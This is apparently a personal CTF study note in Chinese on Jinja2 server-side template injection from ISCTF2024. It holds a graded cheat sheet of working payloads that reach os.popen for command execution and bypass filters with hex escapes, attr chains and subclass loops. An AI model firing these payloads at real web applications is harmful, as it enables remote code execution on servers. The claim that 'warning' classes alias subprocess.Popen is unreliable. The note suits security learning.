
#wp #web

【[[WEB]]】[[ssti]] - [[扩展题目]]

创建时间：2025-07-06 00:28

题目来源：ISCTF2024
### 解题过程

```python
{{lipsum
  |attr("\u005f\u005fglobals\u005f\u005f")
  |attr("\u005f\u005fgetitem\u005f\u005f")("os")
  |attr("popen")("cat /flag")
  |attr("read")()
}}
```

SSTI payload参考：
##### level 1  测试是否存在ssti
```
{{7*7}}    
```
##### level 2  直接执行系统命令（无过滤）
```
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```
##### level 3  子类枚举触发 Popen（绕过对 config 的依赖）
```
{{''.__class__.mro()[1].__subclasses__()[396]('cat /flag', shell=True, stdout=-1).communicate()[0]}}
```
##### level 4  中级绕过——点与下划线被过滤
1. **数组/字典访问**：
```
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag')['read']()}}
```
2. **Hex 转义下划线**：
```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat /flag')['read']()}}
```
##### level 5  高级绕过——`attr` 过滤器链
	完全不用 `.`、`_`、`[]`，通过 Jinja2 的 `attr` 动态调用,利用管道和 `attr` 彻底绕过黑名单
```
{{request
  |attr('application')
  |attr('\x5f\x5fglobals\x5f\x5f')
  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
  |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
  |attr('popen')('cat /flag')
  |attr('read')()
}}
```
##### level 6 `config.items()` + 子类枚举
- 当 `config` 对象或 `__init__.__globals__` 被屏蔽时，可先枚举配置项再反射：
```
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/tmp/flag').read()}}
```
先从 `config.items()` 拿到任意对象，再通过其 `__class__` 枚举子类 [pwny.cc](https://www.pwny.cc/web-attacks/server-side-template-injection-ssti?utm_source=chatgpt.com)
##### level 7 极致绕过——动态 for 循环 + 条件筛选
- 无需固定索引，遍历子类列表并按名称筛选执行（适合对索引未知的环境）：
```
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').popen(request.args.input).read() }}
  {% endif %}
{% endfor %}
```
遍历所有子类，匹配名称包含 “warning” 的类（通常是 `subprocess.Popen` 的别名），再执行命令 [github.com](https://github.com/payloadbox/ssti-payloads?utm_source=chatgpt.com)
